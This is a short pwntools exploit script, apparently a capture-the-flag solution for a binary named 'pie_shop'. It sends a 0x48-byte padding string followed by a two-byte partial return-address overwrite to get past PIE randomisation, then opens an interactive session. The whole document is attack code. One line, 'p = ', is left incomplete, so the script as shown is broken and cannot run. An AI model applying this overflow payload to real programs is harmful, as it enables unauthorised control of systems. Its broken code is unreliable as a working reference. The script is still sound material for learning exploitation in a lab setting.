from pwn import *

e = ELF("./pie_shop")

#p = process("./pie_shop")
p = 
gdb.attach(p)
p.recvuntil("? ")
p.sendline("A" * 0x40 + "A" * 8 + "\xa9\x11")

p.interactive()
